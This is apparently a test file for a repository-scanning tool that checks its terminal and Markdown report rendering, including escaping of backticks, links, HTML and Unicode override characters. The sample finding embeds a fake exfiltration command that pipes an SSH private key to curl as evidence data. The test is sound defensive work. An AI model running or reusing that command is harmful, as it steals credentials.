"""Rendering a report with findings, ready for M2 onwards."""

import io
from datetime import UTC, datetime

from lookfirst.verdict.render_markdown import md_code, md_text, render_markdown
from lookfirst.verdict.render_terminal import make_console, render_terminal
from lookfirst.verdict.schema import CheckKind, Evidence, Finding, NotChecked, Severity, Target
from lookfirst.verdict.scoring import build_report


def sample_report():
    findings = [
        Finding(
            id="install_path.credential_theft",
            check=CheckKind.install_path,
            severity=Severity.critical,
            title="Install script reads your SSH key and sends it out",
            evidence=[
                Evidence(
                    type="file",
                    ref="install.sh",
                    line=12,
                    excerpt="cat ~/.ssh/id_ed25519 | curl -d @- https://x`y|z",
                ),
            ],
            explanation="Scripts that read keys and send them over the network steal access.",
            recommendation="Don't run it.",
        ),
        Finding(
            id="package.known_vulnerability",
            check=CheckKind.package,
            severity=Severity.medium,
            title="A dependency has a known vulnerability",
            explanation="An old version of a library has a published security bug.",
            recommendation="Update it.",
            source="osv-scanner",
            source_version="2.7.0",
        ),
    ]
    return build_report(
        target=Target(kind="github", raw="evil/viral-tool", resolved="evil/viral-tool@" + "b" * 40),
        findings=findings,
        checked=[CheckKind.install_path, CheckKind.package],
        not_checked=[
            NotChecked(
                check=CheckKind.sandbox,
                what="Sandbox dry run",
                reason="not requested",
                how_to_enable="add --sandbox",
            )
        ],
        now=datetime(2026, 11, 6, 12, 0, tzinfo=UTC),
    )


def terminal_text(report) -> str:
    buffer = io.StringIO()
    render_terminal(report, make_console(file=buffer, width=100, color_system=None))
    return buffer.getvalue()


def test_terminal_shows_verdict_reasons_and_details() -> None:
    out = terminal_text(sample_report())
    lines = [line.strip() for line in out.splitlines() if line.strip()]
    assert lines[0] == "Don't run: we found serious warning signs."
    assert lines[1] == "• Install script reads your SSH key and sends it out"
    assert "Skeleton build" not in out
    assert "CRITICAL" in out and "MEDIUM" in out
    assert "Evidence: install.sh line 12" in out
    assert "Found by osv-scanner 2.7.0" in out
    assert out.index("CRITICAL") < out.index("MEDIUM")


def test_markdown_shows_verdict_reasons_and_details() -> None:
    md = render_markdown(sample_report())
    assert md.startswith("# lookfirst report: Don't run\n")
    assert "1. Install script reads your SSH key and sends it out" in md
    assert "### CRITICAL: Install script reads your SSH key and sends it out" in md
    assert "- Evidence: `install.sh` line 12" in md
    assert "- Found by osv-scanner 2.7.0" in md
    assert "| Checked | 2026-11-06 12:00 UTC with lookfirst" in md


def test_markdown_code_spans_cant_be_broken_out_of() -> None:
    assert md_code("a`b") == "``a`b``"
    assert md_code("`edge`") == "`` `edge` ``"
    assert md_code("x|y") == "`x\\|y`"


def test_markdown_text_escapes_links_and_html() -> None:
    assert md_text("[click](https://evil.example)") == "\\[click\\](https://evil.example)"
    assert md_text("<script>") == "\\<script\\>"
    assert md_text("a\u202eb") == "a<U+202E>b"
